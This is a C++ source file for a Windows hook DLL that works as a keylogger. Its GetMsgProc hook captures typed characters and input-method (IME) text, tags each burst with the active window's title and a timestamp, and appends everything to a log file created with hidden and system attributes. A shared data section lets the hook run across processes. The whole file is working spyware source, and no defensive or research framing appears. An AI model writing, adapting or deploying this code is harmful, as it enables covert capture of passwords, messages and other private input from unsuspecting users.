// HookDll.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <Windows.h>
#pragma comment(lib, "Imm32.lib")

#define KEY_BUF_SIZE	16

typedef	struct
{
	HWND	hActWnd;						//current actived window
	char	strRecordFile[MAX_PATH];
	char	keybuffer[KEY_BUF_SIZE];		//log buffer
	DWORD	usedlen;						//
	DWORD	LastMsgTime;
}TShared;

//
#pragma data_seg("SharedData")
extern "C" __declspec(dllexport) TShared SharedData = { 0 };
#pragma data_seg()
#pragma comment(linker,"/SECTION:SharedData,rws")

extern "C" __declspec(dllexport) LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam);

void WriteToFile(const char* lpBuffer,int length)
{
	HANDLE	hFile = CreateFile(SharedData.strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_ARCHIVE|
		FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN, NULL);
	
	if (hFile != INVALID_HANDLE_VALUE) {
		DWORD dwBytesWrite = 0;
		DWORD dwSize = GetFileSize(hFile, NULL);
		if (dwSize < 1024 * 1024 * 50)
			SetFilePointer(hFile, 0, 0, FILE_END);
		WriteFile(hFile, lpBuffer, length, &dwBytesWrite, NULL);
		CloseHandle(hFile);
	}	
}

void SaveLog(const char* buffer, int len,bool flushImmediately) {
	//检查ActiveWnd是否改变
	HWND hWnd = GetActiveWindow();
	if (hWnd != SharedData.hActWnd){
		char szCaption[512];
		char strSaveString[1024 * 2];
		SYSTEMTIME	SysTime;

		SharedData.hActWnd = hWnd;
		GetWindowText(SharedData.hActWnd, szCaption, sizeof(szCaption));
		
		GetLocalTime(&SysTime);
		wsprintfA(
			strSaveString,
			"\r\n[%02d/%02d/%d %02d:%02d:%02d] (%s)\r\n",
			SysTime.wMonth, SysTime.wDay, SysTime.wYear,
			SysTime.wHour, SysTime.wMinute, SysTime.wSecond,
			szCaption);
		//把之前的数据写到文件里面
		WriteToFile(SharedData.keybuffer, SharedData.usedlen);
		SharedData.usedlen = 0;
		//
		WriteToFile(strSaveString,strlen(strSaveString));
	}
	if (flushImmediately) {
		return WriteToFile(buffer, len);
	}

	if (len >= KEY_BUF_SIZE) {
		return WriteToFile(buffer, len);
	}
	
	if ((SharedData.usedlen + len) >= KEY_BUF_SIZE) {
		WriteToFile(SharedData.keybuffer, SharedData.usedlen);
		SharedData.usedlen = 0;
	}
	//Append Data to buffer;
	for (int i = 0; i < len; i++){
		(SharedData.keybuffer + SharedData.usedlen)[i] = buffer[i];
	}
	SharedData.usedlen += len;
}


LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	MSG* pMsg;
	char	strChar[2];
	char	KeyName[20];
	LRESULT result = CallNextHookEx(NULL, nCode, wParam, lParam);

	pMsg = (MSG*)(lParam);

	if ((nCode != HC_ACTION) || ((pMsg->message != WM_IME_COMPOSITION) && (pMsg->message != WM_CHAR)) ||
		(SharedData.LastMsgTime == pMsg->time))
	{
		return result;
	}
	SharedData.LastMsgTime = pMsg->time;

	if ((pMsg->message == WM_IME_COMPOSITION) && (pMsg->lParam & GCS_RESULTSTR))
	{
		HWND	hWnd = pMsg->hwnd;
		HIMC	hImc = ImmGetContext(hWnd);
		char	buff[0x1000];
		LONG	strLen = ImmGetCompositionString(hImc, GCS_RESULTSTR, NULL, 0);
		if (strLen > 0) {

			strLen = strLen < sizeof(buff) ? strLen : sizeof(buff);
			strLen = ImmGetCompositionString(hImc, GCS_RESULTSTR, buff, strLen);
			ImmReleaseContext(hWnd, hImc);
			SaveLog(buff, strLen, false);
		}
	}
	else if (pMsg->message == WM_CHAR)
	{
		if (pMsg->wParam <= 127 && pMsg->wParam >= 20)
		{
			strChar[0] = pMsg->wParam;
			strChar[1] = '\0';
			SaveLog(strChar,1, NULL);
		}
		else if (pMsg->wParam == VK_RETURN)
		{
			SaveLog("[Enter]",7, NULL);
		}
		else
		{
			memset(KeyName, 0, sizeof(KeyName));
			if (GetKeyNameText(pMsg->lParam, &(KeyName[1]), sizeof(KeyName) - 2) > 0)
			{
				KeyName[0] = '[';
				lstrcatA(KeyName, "]");
				SaveLog(KeyName,strlen(KeyName),NULL);
			}
		}
	}
	return result;
}

#pragma comment(linker,"/entry:MyEntry")


BOOL __stdcall MyEntry(
	HINSTANCE hinstDLL,  // handle to the DLL module
	DWORD fdwReason,     // reason for calling function
	LPVOID lpvReserved   // reserved
)
{

	return TRUE;
}
